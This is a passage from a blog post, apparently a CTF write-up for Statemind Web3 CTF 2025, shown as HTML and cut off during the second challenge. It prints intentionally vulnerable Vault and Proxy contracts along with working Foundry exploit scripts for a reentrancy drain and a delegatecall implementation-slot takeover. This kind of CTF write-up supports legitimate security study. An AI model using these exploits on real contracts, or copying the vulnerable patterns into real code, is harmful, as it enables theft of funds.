<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Statemind Web3 CTF 2025
        
    </title><meta content="Statemind Web3 CTF 2025" property=og:title><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel=stylesheet><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><noscript><img src="https://themj0ln1r.goatcounter.com//count?p=/archive/statemindctf25/&t=Statemind Web3 CTF 2025"></noscript><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
              tex: {
                inlineMath: [['$', '$'], ['\\(', '\\)']]
              }
            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/><b>TheMj0ln1r Blog</b></a><div class=socials></div></div><nav><a href=https://themj0ln1r.github.io/cv style=margin-left:.5em><b>CV</b></a><a href=https://themj0ln1r.github.io/archive style=margin-left:.5em><b>Archive</b></a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em><b>Tags</b></a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Statemind Web3 CTF 2025</div><div class=meta>Posted on <time>2025-01-14</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/blockchain/>blockchain</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/solidity/>solidity</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/bridge/>bridge</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/defi/>defi</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/huff/>Huff</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/evm/>evm</a> </span></div></div><div class=toc-container><h5 class=toc-title>Table of Contents</h5><ul class=toc-list><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#vault>Vault</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution>solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#proxy>Proxy</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-1>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#lending>Lending</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-2>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#yeild>Yeild</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-3>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#oracle>Oracle</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-4>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#stablecoin>Stablecoin</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-5>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#bridge>Bridge</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-6>Solution</a></li><ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#erc777>ERC777</a><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#attack>Attack</a></ul></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#exchange>Exchange</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-7>Solution</a></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#fallout>Fallout</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#solution-8>Solution</a></li><ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#elliptic-curve-cryptography>Elliptic Curve Cryptography</a><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#ecdsa-signing-process>ECDSA Signing Process</a><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#ecdsa-verification-process>ECDSA Verification Process</a><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#attack-1>Attack</a></ul></ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#chef>Chef</a> <ul><li><a href=https://themj0ln1r.github.io/archive/statemindctf25/#references>References</a></ul></ul></div><section class=body><p>Alpha content here... To keep up my security review skills, I participated in Statemind web3 security fellowship CTF focused on smart contract security of various concepts like,<ul><li>DeFi protocol vulnerabilities<li>Cross-chain bridge security<li>Oracle manipulation<li>Cryptographic implementations<li>Solidity and Vyper smart contracts<li>Huff programming</ul><p>I'm super excited to share my solutions and insights from this CTF, where I managed to secure a spot in the top 3! üèÜ Get ready for detailed writeups of each challenge - trust me, you won't want to miss these!<p>All of these challenges with solutions can be found here : <a href=https://github.com/TheMj0ln1r/statemind-web3-ctf>TheMj0ln1r/statemind-web3-ctf</a><h1 id=vault>Vault</h1><p>P: "Your goal is to drain all ether from the Vault contract. Use the deposit and withdraw functions to reduce the vault's balance to zero. Once the isSolved function returns true, you've completed the challenge."<div class=note-container><button class=note-toggle><div class=note-icon><p>Vault.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: UNLICENSED
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.6.12</span><span>;
</span><span style=color:#a71d5d;font-weight:700>pragma experimental</span><span> ABIEncoderV2;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Vault </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> balances;
</span><span>
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_player) </span><span style=color:#a71d5d;font-weight:700>public payable </span><span>{
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(</span><span style=color:#0086b3>address </span><span>_to) </span><span style=color:#a71d5d;font-weight:700>public payable </span><span>{
</span><span>        balances[_to] </span><span style=color:#a71d5d;font-weight:700>+= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_amount) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>=</span><span> _amount) {
</span><span>            (</span><span style=color:#0086b3>bool</span><span> success,) </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>.</span><span style=color:#a71d5d;font-weight:700>call</span><span>{value: _amount}(</span><span style=color:#183691>""</span><span>);
</span><span>            </span><span style=color:#a71d5d;font-weight:700>require</span><span>(success, </span><span style=color:#183691>"call failed"</span><span>);
</span><span>            balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-=</span><span> _amount;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#0086b3>address </span><span>_who) </span><span style=color:#a71d5d;font-weight:700>public view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span> balance) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> balances[_who];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>).balance </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution>solution</h2><p>The vulnerability in this contract lies in the <code>withdraw</code> function, which is susceptible to a reentrancy attack. Here's why:<ol><li>The contract follows the checks-effects-interactions pattern incorrectly<li>The balance is updated after the external call<li>The contract uses a low-level <code>call</code> which forwards all gas</ol><p>Here's how I exploited it:<p>The exploit script uses a malicious contract (<code>Attack</code>) that implements a <code>receive()</code> function to recursively withdraw funds from the vault. When the vault sends ETH to our contract, the <code>receive()</code> function is triggered, allowing us to withdraw more funds before the vault updates its balance.<div class=note-container><button class=note-toggle><div class=note-icon><p>Vault.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.6.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Vault} from "../src/Vault.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>VaultSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Vault </span><span style=color:#a71d5d;font-weight:700>public </span><span>vault </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Vault</span><span>(</span><span style=color:#0086b3>0x1B3C95A210A8C896b1C14D992600087668cd0174</span><span>);
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Vault : "</span><span>, </span><span style=color:#0086b3>address</span><span>(vault));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Vault balance: "</span><span>, </span><span style=color:#0086b3>address</span><span>(vault).balance);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance: "</span><span>, player.balance);
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>address</span><span>(vault));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack balance: "</span><span>, </span><span style=color:#0086b3>address</span><span>(attack).balance);
</span><span>
</span><span>        attack.</span><span style=color:#62a35c>exploit</span><span>{value: </span><span style=color:#0086b3>0.001 ether</span><span>}();
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Vault balance: "</span><span>, </span><span style=color:#0086b3>address</span><span>(vault).balance);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack balance: "</span><span>, </span><span style=color:#0086b3>address</span><span>(attack).balance);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance: "</span><span>, player.balance);
</span><span>
</span><span>
</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack</span><span>{
</span><span>    Vault </span><span style=color:#a71d5d;font-weight:700>public </span><span>vault;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_vault) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        vault </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Vault</span><span>(_vault);
</span><span>
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#a71d5d;font-weight:700>public payable</span><span>{
</span><span>        vault.</span><span style=color:#62a35c>deposit</span><span>{value: </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>value</span><span>}(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>        vault.</span><span style=color:#62a35c>withdraw</span><span>(</span><span style=color:#0086b3>0.001 ether</span><span>);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// I need my testnet tokens back
</span><span>        </span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>.</span><span style=color:#a71d5d;font-weight:700>call</span><span>{value : </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>).balance}(</span><span style=color:#183691>""</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>receive</span><span>() </span><span style=color:#a71d5d;font-weight:700>payable external</span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#0086b3>address</span><span>(vault).balance </span><span style=color:#a71d5d;font-weight:700>>= </span><span style=color:#0086b3>0.001 ether</span><span>){
</span><span>            vault.</span><span style=color:#62a35c>withdraw</span><span>(</span><span style=color:#0086b3>0.001 ether</span><span>);
</span><span>        }
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=proxy>Proxy</h1><p>P: "You've encountered a proxy contract setup where the Proxy delegates calls to an Executor implementation. Find a way to manipulate the logic and get isSolved to return true."<div class=note-container><button class=note-toggle><div class=note-icon><p>Proxy.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol"</span><span>; 
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Proxy </span><span>{
</span><span>    </span><span style=color:#969896;font-style:italic>// bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
</span><span>    </span><span style=color:#0086b3>bytes32 </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> _IMPLEMENTATION_SLOT </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>;
</span><span>    
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>AddressSlot </span><span>{
</span><span>        </span><span style=color:#0086b3>address</span><span> value;
</span><span>    }
</span><span>    
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_logic, </span><span style=color:#0086b3>address </span><span>_player) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(Address.</span><span style=color:#62a35c>isContract</span><span>(_logic), </span><span style=color:#183691>"implementation_not_contract"</span><span>);
</span><span>        </span><span style=color:#62a35c>_getAddressSlot</span><span>(_IMPLEMENTATION_SLOT).value </span><span style=color:#a71d5d;font-weight:700>=</span><span> _logic;
</span><span>
</span><span>        (</span><span style=color:#0086b3>bool</span><span> success,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> _logic.</span><span style=color:#a71d5d;font-weight:700>delegatecall</span><span>(
</span><span>            </span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"initialize(address)"</span><span>, _player)
</span><span>        );
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(success, </span><span style=color:#183691>"call_failed"</span><span>);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_delegate</span><span>(</span><span style=color:#0086b3>address </span><span>implementation) </span><span style=color:#a71d5d;font-weight:700>internal virtual </span><span>{
</span><span>        </span><span style=color:#969896;font-style:italic>// solhint-disable-next-line no-inline-assembly
</span><span>        </span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
</span><span>            </span><span style=color:#62a35c>calldatacopy</span><span>(0, 0, </span><span style=color:#62a35c>calldatasize</span><span>())
</span><span>            </span><span style=color:#a71d5d;font-weight:700>let</span><span> result </span><span style=color:#a71d5d;font-weight:700>:= </span><span style=color:#62a35c>delegatecall</span><span>(</span><span style=color:#62a35c>gas</span><span>(), implementation, 0, </span><span style=color:#62a35c>calldatasize</span><span>(), 0, 0)
</span><span>            </span><span style=color:#62a35c>returndatacopy</span><span>(0, 0, </span><span style=color:#62a35c>returndatasize</span><span>())
</span><span>            </span><span style=color:#a71d5d;font-weight:700>switch</span><span> result
</span><span>            </span><span style=color:#a71d5d;font-weight:700>case</span><span> 0 { </span><span style=color:#62a35c>revert</span><span>(0, </span><span style=color:#62a35c>returndatasize</span><span>()) }
</span><span>            default { return(0, returndatasize()) }
</span><span>        }
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>// proxy fallback
</span><span>    </span><span style=color:#62a35c>fallback</span><span>() external payable virtual {
</span><span>        </span><span style=color:#62a35c>_delegate</span><span>(</span><span style=color:#62a35c>_getAddressSlot</span><span>(_IMPLEMENTATION_SLOT).value);
</span><span>    }
</span><span>    function </span><span style=color:#62a35c>_getAddressSlot</span><span>(</span><span style=color:#0086b3>bytes32</span><span> slot) internal pure </span><span style=color:#62a35c>returns </span><span>(AddressSlot </span><span style=color:#a71d5d;font-weight:700>storage </span><span>r) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>assembly </span><span>{
</span><span>            r.slot </span><span style=color:#a71d5d;font-weight:700>:=</span><span> slot
</span><span>        }
</span><span>    }
</span><span>}
</span><span>contract Executor is Initializable {
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> owner;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>
</span><span>    function </span><span style=color:#62a35c>initialize</span><span>(</span><span style=color:#0086b3>address</span><span> _player) external initializer {
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>;
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>    modifier onlyOwner {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender ==</span><span> owner, </span><span style=color:#183691>"not_owner"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>    function </span><span style=color:#62a35c>execute</span><span>(</span><span style=color:#0086b3>address</span><span> logic) external payable {
</span><span>        (</span><span style=color:#0086b3>bool</span><span> success,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> logic.</span><span style=color:#a71d5d;font-weight:700>delegatecall</span><span>(</span><span style=color:#a71d5d;font-weight:700>abi</span><span>.</span><span style=color:#a71d5d;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"exec()"</span><span>));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(success, </span><span style=color:#183691>"call_fail"</span><span>);
</span><span>    }
</span><span>    function </span><span style=color:#62a35c>isSolved</span><span>() external pure </span><span style=color:#62a35c>returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>false</span><span>;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h2 id=solution-1>Solution</h2><p>Okay, we got one vulnerable proxy implementation. This is a <code>delegatecall</code> based proxy pattern in which the Proxy contract holding the storage and logic is present in the Executor contract.<p>The goal is to manipulate the logic to make <code>isSolved()</code> return true. But If we observe that <code>isSolved()</code> function, it always returns <code>false</code> and it is hardcoded in the contract. So, that means we need to do complete upgrade of that contract and re-deploy in such a that it returns <code>true</code>.<p>The key vulnerability lies in the <code>execute()</code> function which uses <code>delegatecall</code> to execute arbitrary logic, allowing us to potentially manipulate the contract's state. Simply, the calls to Proxy contract is delegated to the Executor and the Executor is delegating to the <code>exec()</code> function of a arbitray Logic contract. So the context of the call (<code>msg.sender</code>, <code>msg.value</code>, <code>this</code> and storage) remains same inside the <code>exec()</code> function on Logic. So, If we can update the Executor address in the Proxy slot to a new contract which have the logic of returning <code>true</code> on calling <code>isSolved()</code> then the chall is done. This is what I did in the following exploit script.<div class=note-container><button class=note-toggle><div class=note-icon><p>Proxy.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Proxy, Executor} from "../src/Proxy.sol";
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>ProxySolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Proxy </span><span style=color:#a71d5d;font-weight:700>public </span><span>proxy </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Proxy</span><span>(</span><span style=color:#0086b3>payable</span><span>(</span><span style=color:#0086b3>0x09FAb0F0CC143875873F111A27DF77B6ade37a20</span><span>));
</span><span>    Executor </span><span style=color:#a71d5d;font-weight:700>public </span><span>executor </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Executor</span><span>(</span><span style=color:#0086b3>address</span><span>(proxy));
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Deploy
</span><span>    </span><span style=color:#969896;font-style:italic>// function setUp() external{
</span><span>    </span><span style=color:#969896;font-style:italic>//     executor = new Executor();
</span><span>    </span><span style=color:#969896;font-style:italic>//     proxy = new Proxy(address(executor), player);
</span><span>    </span><span style=color:#969896;font-style:italic>//     executor = Executor(address(proxy));
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>//     vm.deal(player, 1 ether);
</span><span>    </span><span style=color:#969896;font-style:italic>// }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy : "</span><span>, </span><span style=color:#0086b3>address</span><span>(proxy));
</span><span>        </span><span style=color:#0086b3>bytes32</span><span> logic </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>load</span><span>(</span><span style=color:#0086b3>address</span><span>(proxy), </span><span style=color:#0086b3>bytes32</span><span>(</span><span style=color:#0086b3>uint256</span><span>(</span><span style=color:#0086b3>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"logic in Proxy"</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#0086b3>uint160</span><span>(</span><span style=color:#0086b3>uint256</span><span>(logic))));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy Owner: "</span><span>, executor.</span><span style=color:#62a35c>owner</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player in Proxy: "</span><span>, executor.</span><span style=color:#62a35c>player</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance: "</span><span>, player.balance);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved(): "</span><span>, executor.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>        NewExecutor newExecutor </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>NewExecutor</span><span>();
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#0086b3>address</span><span>(newExecutor)), player);
</span><span>        executor.</span><span style=color:#62a35c>execute</span><span>(</span><span style=color:#0086b3>address</span><span>(attack));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack : "</span><span>, </span><span style=color:#0086b3>address</span><span>(attack));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"NewExecutor : "</span><span>, </span><span style=color:#0086b3>address</span><span>(newExecutor));
</span><span>        logic </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>load</span><span>(</span><span style=color:#0086b3>address</span><span>(proxy), </span><span style=color:#0086b3>bytes32</span><span>(</span><span style=color:#0086b3>uint256</span><span>(</span><span style=color:#0086b3>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span>)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"logic in Proxy"</span><span>, </span><span style=color:#0086b3>address</span><span>(</span><span style=color:#0086b3>uint160</span><span>(</span><span style=color:#0086b3>uint256</span><span>(logic))));
</span><span>        </span><span style=color:#969896;font-style:italic>// executor.initialize(player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Proxy Owner: "</span><span>, executor.</span><span style=color:#62a35c>owner</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player in Proxy: "</span><span>, executor.</span><span style=color:#62a35c>player</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"isSolved(): "</span><span>, executor.</span><span style=color:#62a35c>isSolved</span><span>());
</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>AddressSlot </span><span>{
</span><span>        </span><span style=color:#0086b3>address</span><span> value;
</span><span>    }
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> owner;
